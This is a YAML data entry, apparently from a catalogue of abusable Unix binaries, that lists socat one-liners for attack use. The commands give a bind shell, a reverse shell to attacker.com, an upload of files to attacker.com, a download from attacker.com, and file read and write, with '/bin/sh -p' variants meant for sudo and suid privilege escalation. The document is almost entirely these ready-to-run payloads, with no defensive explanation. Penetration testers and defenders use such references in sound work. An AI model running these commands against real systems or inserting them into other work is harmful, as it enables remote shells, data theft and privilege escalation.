---
functions:
  bind-shell:
  - code: |-
      socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane
    connector: tcp-client-tty
    contexts:
      sudo:
      suid:
        code: |-
          socat tcp-listen:12345,reuseaddr,fork 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
        shell: false
      unprivileged:
  download:
  - code: |-
      socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat
    contexts:
      sudo:
      suid:
      unprivileged:
    sender: tcp-server
  file-read:
  - code: |-
      socat -u file:/path/to/input-file -
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      socat -u 'exec:echo DATA' open:/path/to/output-file,creat
    comment: |-
      The `echo` command is actually used.
    contexts:
      sudo:
      suid:
      unprivileged:
  reverse-shell:
  - code: |-
      socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
    contexts:
      sudo:
      suid:
        code: |-
          socat tcp-connect:attacker.com:12345 'exec:/bin/sh -p,pty,stderr,setsid,sigint,sane'
        shell: false
      unprivileged:
    listener: tcp-server-tty
  shell:
  - code: |-
      socat - exec:/bin/sh,pty,ctty,raw,echo=0
    contexts:
      sudo:
      suid:
        code: |-
          socat - 'exec:/bin/sh -p,pty,ctty,raw,echo=0'
        shell: false
      unprivileged:
  upload:
  - code: |-
      socat -u file:/path/to/input-file tcp-connect:attacker.com:12345
    contexts:
      sudo:
      suid:
      unprivileged:
    receiver: tcp-server
...
